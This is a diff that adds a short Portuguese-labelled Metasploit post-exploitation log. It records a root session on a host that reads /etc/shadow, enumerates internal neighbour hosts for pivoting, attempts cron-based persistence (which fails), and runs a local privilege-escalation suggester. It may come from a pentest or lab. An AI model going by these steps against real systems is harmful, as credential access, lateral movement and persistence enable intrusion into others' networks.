@@ -1,0 +1,18 @@
+[msf-post] === ETAPA 3 — 1 session(s) ativa(s) — action=all ===
+MSF_GETUID: sid=1 | Server username: root
+MSF_CREDS_COLLECTED: sid=1 | /etc/shadow LIDO (593B) — root sem hash (senha desabilitada: 'root:*:20716:0:99999:7:::') — acesso ao arquivo de credenciais confirmado, sem hash quebrável
+MSF_PIVOT_NEIGHBOR: sid=1 | 172.25.0.10 (8e:7c:01:f3:1c:0a)
+MSF_PIVOT_NEIGHBOR: sid=1 | 172.17.0.2 (1e:44:23:58:e1:24)
+MSF_PIVOT_NEIGHBOR: sid=1 | 172.17.0.3 (16:dc:ae:a1:f3:03)
+MSF_PIVOT_NEIGHBOR: sid=1 | 192.168.50.222 (38:ea:a7:19:df:61)
+MSF_PIVOT_NEIGHBOR: sid=1 | 172.25.0.8 (56:d5:fc:54:a0:3c)
+MSF_PIVOT_NEIGHBOR: sid=1 | 192.168.50.221 (00:0c:29:8e:99:e7)
+MSF_PIVOT_NEIGHBOR: sid=1 | 172.17.0.4 (b6:aa:9c:14:5e:ec)
+MSF_PIVOT_NEIGHBOR: sid=1 | 172.26.0.2 (86:91:94:7d:d3:48)
+MSF_PIVOT_NEIGHBOR: sid=1 | 172.17.0.5 (ee:ad:a1:e0:c7:d2)
+MSF_PIVOT_NEIGHBOR: sid=1 | 172.25.0.6 (f6:20:98:a3:f8:ab)
+MSF_PIVOT_NEIGHBOR: sid=1 | 172.23.0.2 (0a:3c:9d:19:71:65)
+MSF_PIVOT_NEIGHBOR: sid=1 | 172.22.0.2 (ca:dc:47:1e:e9:10)
+MSF_PERSIST_READY: sid=1 | /etc/cron.d indisponível/sem permissão ('Listing: /etc/cron.d\n====================\n\nMode             ') — instalação NÃO executada
+MSF_PRIVESC_SUGGESTION: sid=1 | Executando local_exploit_suggester completo (pode levar minutos)...
+MSF_PRIVESC_SUGGESTION: sid=1 | nenhuma vulnerabilidade local verificada (host patcheado — honesto).
